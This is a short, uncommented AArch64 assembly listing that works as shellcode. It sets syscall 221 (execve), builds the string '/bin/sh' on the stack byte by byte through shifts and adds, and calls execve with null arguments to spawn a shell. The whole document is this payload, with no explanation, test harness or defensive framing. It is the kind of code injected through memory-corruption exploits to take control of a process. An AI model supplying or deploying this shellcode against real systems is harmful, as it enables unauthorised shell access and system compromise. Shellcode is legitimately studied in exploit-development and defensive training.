_start:
mov X8, #0xDD 
mov X1, #0
mov X2, #0
mov X3, #0x68
lsl X3, X3, #8
add X3, X3, #0x73
lsl X3, X3, #8
add X3, X3, #0x2f
lsl X3, X3, #8
add X3, X3, #0x6e
lsl X3, X3, #8
add X3, X3, #0x69
lsl X3, X3, #8
add X3, X3, #0x62
lsl X3, X3, #8
add X3, X3, #0x2f
str X3, [sp]
mov X0, sp
svc 0
